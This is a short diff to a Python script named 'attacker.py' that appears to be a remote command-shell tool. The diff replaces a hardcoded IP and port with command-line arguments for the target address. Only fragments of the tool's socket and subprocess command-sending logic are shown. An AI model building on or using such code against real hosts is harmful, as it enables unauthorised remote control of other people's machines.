@@ -1,4 +1,5 @@
 import subprocess
+import argparse
 import threading
 import socket
 import sys
@@ -35,11 +36,17 @@ def sendcommand(process: subprocess.Popen, command):
             print("[!] Exiting (sendcommand::error)")
         sys.exit()
 
+def argument_parser():
+    parser = argparse.ArgumentParser(description="Parser of attacker.py")
+    parser.add_argument("--address", type=str, required=True)
+    parser.add_argument("--port", type=int, required=True)
+
+    return parser.parse_args()
+
 
 if __name__ == "__main__":
-    addr_v4 = "10.100.102.31"
-    port = 20031
-    addr = (addr_v4, port)
+    arguments = argument_parser()
+    addr = (arguments.address, arguments.port)
 
     targetSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     targetSock.connect(addr)
